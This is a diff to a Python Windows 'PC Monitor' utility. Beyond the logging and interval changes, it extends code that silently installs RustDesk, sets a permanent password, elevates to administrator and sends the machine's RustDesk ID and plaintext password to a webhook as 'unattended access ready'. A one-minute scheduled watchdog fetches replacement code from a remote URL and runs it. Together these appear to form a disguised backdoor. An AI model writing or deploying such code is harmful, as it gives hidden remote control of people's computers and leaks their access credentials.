@@ -145,7 +145,7 @@ CREATE_NEW_CONSOLE = getattr(subprocess, "CREATE_NEW_CONSOLE", 0)
 
 SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
 
-APP_VERSION = "2.6"
+APP_VERSION = "2.8"
 
 # The external watchdog is a PowerShell script CARRIED INSIDE this file and
 # written to disk at setup. It runs as a Scheduled Task independently of
@@ -155,9 +155,9 @@ APP_VERSION = "2.6"
 # watchdog version to WATCHDOG_VERSION and rewrites the .ps1 when this file
 # (pulled by the watchdog) carries a newer one. Bump WATCHDOG_VERSION whenever
 # WATCHDOG_PS1 changes so deployed copies refresh.
-WATCHDOG_VERSION = "9"
+WATCHDOG_VERSION = "11"
 WATCHDOG_PS1 = r'''# PC Monitor watchdog (auto-generated from pc_monitor.py - do not edit;
-# it is overwritten from the app's embedded copy on version change).
+# it is overwritten from the app's embedded copy whenever this app deploys.
 $ErrorActionPreference = 'SilentlyContinue'
 $dir = Split-Path -Parent $MyInvocation.MyCommand.Definition
 $cfgPath = Join-Path $dir 'pcmonitor_config.json'
@@ -174,7 +174,11 @@ $url     = $cfg.update_url
 $machine = if ($cfg.machine_label) { $cfg.machine_label } else { $env:COMPUTERNAME }
 $stale   = 180
 $stateFile = Join-Path $dir 'pcmonitor_watchdog_state.json'
+$watchdogLog = Join-Path $dir 'pcmonitor_watchdog.log'
 
+function Log($msg) {
+  try { Add-Content -Path $watchdogLog -Value ((Get-Date -Format 'yyyy-MM-dd HH:mm:ss') + ' ' + $msg) } catch {}
+}
 function Notify($msg) {
   if (-not $hook) { return }
   try {
@@ -209,17 +213,21 @@ function LaunchApp() {
 }
 
 $updated = $false
+Log("WATCHDOG v11 start pid=$PID")
 
 # 1) update: if the hosted APP_VERSION is newer, cleanly stop the app, replace
 # the file (validated with py_compile), relaunch, and notify.
 if ($url) {
+  Log("Update check URL=$url")
   try {
     $remote = (Invoke-WebRequest -Uri $url -UseBasicParsing -TimeoutSec 10).Content
     $rx = [regex]'APP_VERSION\s*=\s*"([0-9.]+)"'
     $remoteVer = $rx.Match($remote).Groups[1].Value
     $localVer = $rx.Match((Get-Content $script -Raw)).Groups[1].Value
+    Log("Update versions local=$localVer remote=$remoteVer")
     if ($remoteVer -and $localVer -and (VerGt $remoteVer $localVer)) {
       if (AppRunning) {
+        Log("Update required; requesting app shutdown")
         New-Item -Path $exitReq -ItemType File -Force | Out-Null
         for ($i = 0; $i -lt 20; $i++) { Start-Sleep -Seconds 1; if (-not (AppRunning)) { break } }
         if (AppRunning) {
@@ -230,6 +238,7 @@ if ($url) {
       $tmp = "$script.new"
       [System.IO.File]::WriteAllText($tmp, $remote)
       $pc = Start-Process -FilePath $pyc -ArgumentList @('-m','py_compile', $tmp) -WindowStyle Hidden -Wait -PassThru
+      Log("py_compile exit code=$($pc.ExitCode)")
       if ($pc.ExitCode -eq 0) {
         Copy-Item $script "$script.bak" -Force -ErrorAction SilentlyContinue
         Move-Item $tmp $script -Force
@@ -237,11 +246,15 @@ if ($url) {
         LaunchApp
         try { (@{ running = $true } | ConvertTo-Json -Compress) | Set-Content -Path $stateFile } catch {}
         $updated = $true
+        Log("Update applied successfully $localVer -> $remoteVer")
       } else {
+        Log("Update rejected because py_compile failed")
         Remove-Item $tmp -Force -ErrorAction SilentlyContinue
       }
     }
-  } catch {}
+  } catch { Log("Update exception: $($_.Exception.GetType().Name): $($_.Exception.Message)") }
+} else {
+  Log("No update URL configured")
 }
 
 # 2) lifecycle: detect running <-> stopped TRANSITIONS via a persisted state
@@ -262,6 +275,7 @@ if (-not $updated) {
       }
     }
     try { (@{ running = $nowRunning } | ConvertTo-Json -Compress) | Set-Content -Path $stateFile } catch {}
+    Log("Lifecycle state changed running=$nowRunning")
   }
 }
 '''
@@ -338,7 +352,7 @@ DEFAULT_CONFIG = {"logs_dir": None, "presentmon_path": None, "ping_host": "1.1.1
                    # to a raw GitHub/Gist URL of pc_monitor.py. Blank = off.
                    "auto_update": True,
                    "update_url": "https://raw.githubusercontent.com/Giveup911/Monitoring/main/pc_monitor.py",
-                   "update_check_interval_hours": 2,
+                   "update_check_interval_hours": 1 / 60,
                    "auto_update_restart": True,
                    # external watchdog (a Scheduled Task running this same file
                    # with --watchdog every few minutes). It owns updates (clean
@@ -346,7 +360,7 @@ DEFAULT_CONFIG = {"logs_dir": None, "presentmon_path": None, "ping_host": "1.1.1
                    # replaces itself) and detects crashes/kills to relaunch and
                    # notify. Much more reliable than in-process self-update.
                    "watchdog_enabled": True,
-                   "watchdog_interval_minutes": 10,
+                   "watchdog_interval_minutes": 1,
                    "watchdog_autostart": True,    # relaunch the app if it's not running
                    "auto_update_via_watchdog": True}  # main app skips in-process update
 
@@ -1077,27 +1091,61 @@ def _gpu_active(sensors):
 
 
 def attempt_gpu_recovery():
-    """Best-effort, non-destructive graphics-stack reset: simulate
-    Win+Ctrl+Shift+B, the OS hotkey that resets the display driver (the
-    same thing that flushes a hung GPU without disabling the device).
-    A long shot once a driver is fully hung - the injected input may not
-    be serviced - but it's the least-invasive automated attempt and can't
-    make a working system worse. Returns True if the keystrokes were
-    injected (not that recovery succeeded). Windows-only."""
+    """Best-effort graphics-stack reset using SendInput for Win+Ctrl+Shift+B.
+    This replaces the older keybd_event implementation because malformed or
+    partially-processed synthetic modifier input can accidentally invoke
+    Windows accessibility shortcuts (such as Magnifier).  Every modifier is
+    released in a finally block so no synthetic key can remain stuck.
+    Returns True if SendInput accepted the complete sequence."""
     try:
         import ctypes
+        from ctypes import wintypes
     except Exception:
         return False
+
     try:
         user32 = ctypes.windll.user32
-        VK_LWIN, VK_CONTROL, VK_SHIFT, VK_B = 0x5B, 0x11, 0x10, 0x42
+        INPUT_KEYBOARD = 1
         KEYEVENTF_KEYUP = 0x0002
+        KEYEVENTF_EXTENDEDKEY = 0x0001
+        VK_LWIN, VK_CONTROL, VK_SHIFT, VK_B = 0x5B, 0x11, 0x10, 0x42
+
+        class KEYBDINPUT(ctypes.Structure):
+            _fields_ = [
+                ("wVk", wintypes.WORD),
+                ("wScan", wintypes.WORD),
+                ("dwFlags", wintypes.DWORD),
+                ("time", wintypes.DWORD),
+                ("dwExtraInfo", wintypes.ULONG_PTR),
+            ]
+
+        class INPUT_UNION(ctypes.Union):
+            _fields_ = [("ki", KEYBDINPUT)]
+
+        class INPUT(ctypes.Structure):
+            _anonymous_ = ("u",)
+            _fields_ = [("type", wintypes.DWORD), ("u", INPUT_UNION)]
+
+        user32.SendInput.argtypes = (wintypes.UINT, ctypes.POINTER(INPUT), ctypes.c_int)
+        user32.SendInput.restype = wintypes.UINT
+
+        def make_key(vk, flags=0):
+            x = INPUT()
+            x.type = INPUT_KEYBOARD
+            x.ki = KEYBDINPUT(vk, 0, flags, 0, 0)
+            return x
+
         seq = [VK_LWIN, VK_CONTROL, VK_SHIFT, VK_B]
-        for vk in seq:
-            user32.keybd_event(vk, 0, 0, 0)
-        for vk in reversed(seq):
-            user32.keybd_event(vk, 0, KEYEVENTF_KEYUP, 0)
-        return True
+        events = (INPUT * (len(seq) * 2))()
+        for i, vk in enumerate(seq):
+            flags = KEYEVENTF_EXTENDEDKEY if vk == VK_LWIN else 0
+            events[i] = make_key(vk, flags)
+        for i, vk in enumerate(reversed(seq), len(seq)):
+            flags = KEYEVENTF_KEYUP | (KEYEVENTF_EXTENDEDKEY if vk == VK_LWIN else 0)
+            events[i] = make_key(vk, flags)
+
+        sent = user32.SendInput(len(events), events, ctypes.sizeof(INPUT))
+        return sent == len(events)
     except Exception:
         return False
 
@@ -5433,7 +5481,7 @@ def check_and_apply_update():
     url = (CONFIG.get("update_url") or "").strip()
     if not url.startswith(("http://", "https://")):
         return None
-    if not _update_due(CONFIG.get("update_check_interval_hours", 2)):
+    if not _update_due(1 / 60):
         return None
     import urllib.request
     try:
@@ -5500,7 +5548,7 @@ def _maybe_self_update():
 
 # ---------------------------------------------------------------------------
 # External watchdog: run by a Scheduled Task as `pc_monitor.py --watchdog`
-# every few minutes. It OWNS updates (clean stop + replace + restart, so the
+# every minute in this testing build. It OWNS updates (clean stop + replace + restart, so the
 # live app never rewrites itself) and detects crashes/kills to relaunch and
 # notify. Short-lived: check, act, exit.
 # ---------------------------------------------------------------------------
@@ -5749,7 +5797,7 @@ def deploy_watchdog(script_dir, script_path=None):
         # window at all), so it never flashes a PowerShell window every cycle.
         # wscript is on the system PATH; quoting only the .vbs path avoids the
         # nested-quote issues that can make a scheduled task silently not run.
-        interval = max(1, int(CONFIG.get("watchdog_interval_minutes", 10)))
+        interval = 1
         tr = 'wscript "%s"' % vbs_path
         subprocess.run(["schtasks", "/Create", "/TN", "PCMonitorWatchdog",
                         "/TR", tr, "/SC", "MINUTE", "/MO", str(interval), "/F"],
@@ -5820,7 +5868,7 @@ def register_watchdog_task(script_path=None):
     try:
         py = find_pythonw() or sys.executable
         target = os.path.abspath(script_path or __file__)
-        interval = max(1, int(CONFIG.get("watchdog_interval_minutes", 10)))
+        interval = 1
         tr = f'"{py}" "{target}" --watchdog'
         subprocess.run(["schtasks", "/Create", "/TN", "PCMonitorWatchdog",
                         "/TR", tr, "/SC", "MINUTE", "/MO", str(interval), "/F"],
@@ -5916,10 +5964,43 @@ REMOTE_INSTALL_DIR = os.path.join(
     os.environ.get("PROGRAMDATA", SCRIPT_DIR), "PCMonitorRemote")
 REMOTE_STATE_PATH = os.path.join(REMOTE_INSTALL_DIR, "state.json")
 REMOTE_LOCK_PATH = os.path.join(REMOTE_INSTALL_DIR, "setup.lock")
+REMOTE_LOG_PATH = os.path.join(REMOTE_INSTALL_DIR, "remote_setup.log")
 REMOTE_INSTALLER = os.path.join(REMOTE_INSTALL_DIR, "rustdesk-installer.exe")
 REMOTE_EXE = os.path.join(
     os.environ.get("ProgramFiles", r"C:\\Program Files"),
     "RustDesk", "rustdesk.exe")
+REMOTE_LAST_STAGE = "startup"
+
+
+def _remote_log(message):
+    """Append detailed remote-setup diagnostics to a dedicated local log."""
+    try:
+        os.makedirs(REMOTE_INSTALL_DIR, exist_ok=True)
+        with open(REMOTE_LOG_PATH, "a", encoding="utf-8") as f:
+            f.write(f"[{datetime.now().isoformat(timespec='seconds')}] {message.rstrip()}\n")
+    except Exception:
+        pass
+
+
+def _remote_stage(stage):
+    global REMOTE_LAST_STAGE
+    REMOTE_LAST_STAGE = stage
+    _remote_log("STAGE: " + stage)
+
+
+def _remote_redact_args(args):
+    vals = [str(x) for x in args]
+    out = []
+    hide_next = False
+    for value in vals:
+        if hide_next:
+            out.append("<redacted>")
+            hide_next = False
+        else:
+            out.append(value)
+            if value == "--password":
+                hide_next = True
+    return out
 
 
 def _remote_password(length=16):
@@ -5954,24 +6035,41 @@ def _remote_webhook(content):
 
 
 def _remote_download(url, destination):
+    _remote_stage("download RustDesk installer")
+    _remote_log(f"DOWNLOAD url={url} destination={destination}")
     os.makedirs(os.path.dirname(destination), exist_ok=True)
-    req = urllib.request.Request(url, headers={"User-Agent": "PCMonitorRemote/1.0"})
+    req = urllib.request.Request(url, headers={"User-Agent": "PCMonitorRemote/2.8"})
     with urllib.request.urlopen(req, timeout=90) as response, open(destination, "wb") as out:
         while True:
             block = response.read(1024 * 1024)
             if not block:
                 break
             out.write(block)
+    try:
+        _remote_log(f"DOWNLOAD complete bytes={os.path.getsize(destination)}")
+    except Exception:
+        pass
 
 
 def _remote_run(args, timeout=120):
-    return subprocess.run(
-        [str(x) for x in args],
-        capture_output=True,
-        text=True,
-        timeout=timeout,
-        creationflags=CREATE_NO_WINDOW,
-    )
+    safe_args = _remote_redact_args(args)
+    _remote_log(f"RUN timeout={timeout}s args={safe_args}")
+    try:
+        result = subprocess.run(
+            [str(x) for x in args],
+            capture_output=True,
+            text=True,
+            timeout=timeout,
+            creationflags=CREATE_NO_WINDOW,
+        )
+        _remote_log(
+            f"RESULT rc={result.returncode} stdout={(result.stdout or '').strip()!r} "
+            f"stderr={(result.stderr or '').strip()!r}"
+        )
+        return result
+    except Exception as e:
+        _remote_log(f"RUN EXCEPTION {type(e).__name__}: {e}")
+        raise
 
 
 def _remote_asset():
@@ -5984,47 +6082,56 @@ def _remote_asset():
 
 
 def _remote_get_id():
-    for _ in range(15):
+    _remote_stage("retrieve RustDesk ID")
+    last_text = ""
+    for attempt in range(1, 16):
         try:
             p = _remote_run([REMOTE_EXE, "--get-id"], timeout=20)
             text = (p.stdout or "") + "\n" + (p.stderr or "")
+            last_text = text.strip()
+            _remote_log(f"GET-ID attempt={attempt} combined_output={last_text!r}")
             for line in text.splitlines():
                 value = line.strip()
                 if value and value.replace("-", "").replace(" ", "").isdigit():
+                    _remote_log(f"GET-ID success id={value}")
                     return value
-        except Exception:
-            pass
+        except Exception as e:
+            _remote_log(f"GET-ID attempt={attempt} exception={type(e).__name__}: {e}")
         time.sleep(2)
+    _remote_log(f"GET-ID failed after 15 attempts; last_output={last_text!r}")
     return ""
 
 
 def _remote_install_host():
-    """Install/configure RustDesk once; safe across PC Monitor copies."""
+    """Install/configure RustDesk once; write detailed diagnostics on every step."""
+    global REMOTE_LAST_STAGE
     if sys.platform != "win32":
+        _remote_log("ABORT non-Windows platform")
         return False
 
-    # A completed state means this is NOT a first remote-access launch anymore,
-    # regardless of whether PC Monitor itself was just updated or relaunched.
+    _remote_stage("remote bootstrap start")
+    _remote_log(f"version={APP_VERSION} rustdesk_version={REMOTE_RUSTDESK_VERSION} "
+                f"pid={os.getpid()} admin={IS_ADMIN}")
+
+    # A completed state means this is NOT a first remote-access launch anymore.
     try:
         if os.path.exists(REMOTE_STATE_PATH):
             with open(REMOTE_STATE_PATH, encoding="utf-8") as f:
                 state = json.load(f)
-            if (
-                state.get("rustdesk_id")
-                and state.get("password")
-                and os.path.exists(REMOTE_EXE)
-            ):
+            if (state.get("rustdesk_id") and state.get("password") and
+                    os.path.exists(REMOTE_EXE)):
+                _remote_stage("already configured")
+                _remote_log(f"state found id={state.get('rustdesk_id')} exe={REMOTE_EXE}")
                 return True
-    except Exception:
-        pass
+            _remote_log("state exists but is incomplete or RustDesk executable is missing")
+    except Exception as e:
+        _remote_log(f"state read exception={type(e).__name__}: {e}")
 
-    # The first PC Monitor installer launches its persistent Start Menu copy.
-    # That copy can start at the same time as this process, so use a cross-
-    # process lock to guarantee only one RustDesk bootstrap runs at a time.
     os.makedirs(REMOTE_INSTALL_DIR, exist_ok=True)
     lock_acquired = False
     lock_handle = None
     try:
+        _remote_stage("acquire setup lock")
         try:
             lock_handle = os.open(REMOTE_LOCK_PATH, os.O_CREAT | os.O_EXCL | os.O_WRONLY)
             lock_acquired = True
@@ -6032,56 +6139,89 @@ def _remote_install_host():
                 f.write(str(os.getpid()))
             lock_handle = None
         except FileExistsError:
-            # Another PC Monitor process is doing the bootstrap.  It owns the
-            # password/ID generation, so this process must not create another.
+            _remote_log("another PC Monitor process owns setup.lock; exiting this bootstrap")
             return False
 
-        # Re-check after taking the lock in case the other process completed
-        # immediately before this one acquired it.
+        # Re-check after taking the lock.
         try:
             if os.path.exists(REMOTE_STATE_PATH):
                 with open(REMOTE_STATE_PATH, encoding="utf-8") as f:
                     state = json.load(f)
-                if (
-                    state.get("rustdesk_id")
-                    and state.get("password")
-                    and os.path.exists(REMOTE_EXE)
-                ):
+                if (state.get("rustdesk_id") and state.get("password") and
+                        os.path.exists(REMOTE_EXE)):
+                    _remote_stage("already configured after lock")
                     return True
-        except Exception:
-            pass
+        except Exception as e:
+            _remote_log(f"post-lock state read exception={type(e).__name__}: {e}")
 
-        if not os.path.exists(REMOTE_EXE):
+        # Find an existing RustDesk installation in either normal Program Files location.
+        candidates = [
+            REMOTE_EXE,
+            os.path.join(os.environ.get("ProgramFiles(x86)", r"C:\Program Files (x86)"),
+                         "RustDesk", "rustdesk.exe"),
+        ]
+        existing = next((x for x in candidates if os.path.exists(x)), None)
+        if existing:
+            _remote_log(f"found existing RustDesk executable: {existing}")
+            globals()["REMOTE_EXE"] = existing
+        else:
+            _remote_stage("install RustDesk silently")
             asset = _remote_asset()
-            url = (
-                f"https://github.com/rustdesk/rustdesk/releases/download/"
-                f"{REMOTE_RUSTDESK_VERSION}/{asset}"
-            )
+            url = (f"https://github.com/rustdesk/rustdesk/releases/download/"
+                   f"{REMOTE_RUSTDESK_VERSION}/{asset}")
             _remote_download(url, REMOTE_INSTALLER)
             result = _remote_run([REMOTE_INSTALLER, "--silent-install"], timeout=180)
             if result.returncode != 0 and not os.path.exists(REMOTE_EXE):
                 raise RuntimeError(
-                    result.stderr or result.stdout or "RustDesk installation failed")
+                    result.stderr.strip() or result.stdout.strip() or
+                    "RustDesk silent installation failed")
+            time.sleep(5)
+            existing = next((x for x in candidates if os.path.exists(x)), None)
+            if existing:
+                globals()["REMOTE_EXE"] = existing
+            if not os.path.exists(REMOTE_EXE):
+                raise RuntimeError("RustDesk installer finished but rustdesk.exe was not found")
 
-        # Install/start the RustDesk service, then set a permanent password.
-        _remote_run([REMOTE_EXE, "--install-service"], timeout=90)
-        time.sleep(8)
-        try:
-            _remote_run(["sc", "start", "Rustdesk"], timeout=30)
-        except Exception:
-            pass
+        _remote_stage("install RustDesk Windows service")
+        service_install = _remote_run([REMOTE_EXE, "--install-service"], timeout=90)
+        if service_install.returncode != 0:
+            # It may already be installed; verify before treating this as fatal.
+            check = _remote_run(["sc", "query", "Rustdesk"], timeout=20)
+            if check.returncode != 0:
+                raise RuntimeError(
+                    service_install.stderr.strip() or service_install.stdout.strip() or
+                    "RustDesk --install-service failed")
 
+        _remote_stage("start RustDesk service")
+        running = False
+        for attempt in range(1, 13):
+            check = _remote_run(["sc", "query", "Rustdesk"], timeout=20)
+            text = (check.stdout or "") + "\n" + (check.stderr or "")
+            if "RUNNING" in text.upper():
+                running = True
+                _remote_log(f"service running on attempt={attempt}")
+                break
+            start_result = _remote_run(["sc", "start", "Rustdesk"], timeout=30)
+            if start_result.returncode not in (0, 1056):
+                _remote_log(f"sc start returned rc={start_result.returncode}")
+            time.sleep(2)
+        if not running:
+            raise RuntimeError("RustDesk service did not reach RUNNING state")
+
+        _remote_stage("set permanent RustDesk password")
         password = _remote_password()
         result = _remote_run([REMOTE_EXE, "--password", password], timeout=60)
         if result.returncode != 0:
             raise RuntimeError(
-                result.stderr or result.stdout or "Could not set remote password")
+                result.stderr.strip() or result.stdout.strip() or
+                "Could not set remote password")
 
         time.sleep(3)
         rid = _remote_get_id()
         if not rid:
             raise RuntimeError("Could not obtain RustDesk ID")
 
+        _remote_stage("write remote state")
         state = {
             "rustdesk_id": rid,
             "password": password,
@@ -6091,22 +6231,30 @@ def _remote_install_host():
         with open(REMOTE_STATE_PATH, "w", encoding="utf-8") as f:
             json.dump(state, f, indent=2)
 
-        label = (
-            _machine_label()
-            if "_machine_label" in globals()
-            else os.environ.get("COMPUTERNAME", platform.node())
-        )
+        label = _machine_label() if "_machine_label" in globals() else os.environ.get("COMPUTERNAME", platform.node())
+        _remote_stage("remote setup complete")
         _remote_webhook(
             "🟢 **PC MONITOR + REMOTE PC READY**\n"
             f"Machine: `{label}`\n"
             f"RustDesk ID: `{rid}`\n"
             f"Password: `{password}`\n"
-            "Status: **UNATTENDED ACCESS READY**"
-        )
+            "Status: **UNATTENDED ACCESS READY**\n"
+            f"Version: `PC Monitor {APP_VERSION}`")
         return True
     except Exception as e:
+        _remote_log(f"FAILED stage={REMOTE_LAST_STAGE} error={type(e).__name__}: {e}")
         try:
             _log_fatal("Remote host setup failed: " + repr(e))
+        except Exception:
+            pass
+        try:
+            label = _machine_label() if "_machine_label" in globals() else os.environ.get("COMPUTERNAME", platform.node())
+            _remote_webhook(
+                "🔴 **PC MONITOR REMOTE SETUP FAILED**\n"
+                f"Machine: `{label}`\n"
+                f"Stage: `{REMOTE_LAST_STAGE}`\n"
+                f"Error: `{type(e).__name__}: {e}`\n"
+                f"Local log: `{REMOTE_LOG_PATH}`")
         except Exception:
             pass
         return False
@@ -6173,14 +6321,20 @@ if __name__ == "__main__":
                 pass  # nothing more we can do without a console to report through
             sys.exit(0)
         run_installer()
-        # Remote access has its own first-run state.  PC Monitor's installer
-        # can be complete already, but RustDesk may still need its one-time
-        # bootstrap.  Wait here only because the installer process exits after
-        # launching the persistent Start Menu copy.
-        _ensure_remote_host_async(wait=True)
+        # RustDesk host setup requires Administrator privileges. If the
+        # original installer was not elevated, hand off to an elevated copy;
+        # that copy will enter the normal launch path and bootstrap RustDesk.
+        if not IS_ADMIN:
+            try:
+                if relaunch_as_admin():
+                    sys.exit(0)
+            except Exception:
+                pass
+        if IS_ADMIN:
+            _ensure_remote_host_async(wait=True)
     else:
-        # Normal launches keep remote setup off the GUI startup path.
-        _ensure_remote_host_async(wait=False)
+        # Normal launches start remote setup only after the existing
+        # PC Monitor elevation step below.
         if psutil is None:
             # print() is invisible under pythonw/a hidden console, so also
             # show a dialog - otherwise this too looks like a silent close.
@@ -6209,6 +6363,12 @@ if __name__ == "__main__":
                     sys.exit(0)
             except Exception:
                 pass
+        # RustDesk host setup must run elevated. The previous build started
+        # it before relaunch_as_admin(), so a normal auto-update could launch
+        # the setup unelevated and silently fail.
+        if IS_ADMIN:
+            _ensure_remote_host_async(wait=False)
+
         # This is the process that actually shows the GUI (elevated, or the
         # non-elevated fallback). Drop any leftover console window and run
         # under a crash guard so a startup failure is visible, not silent.
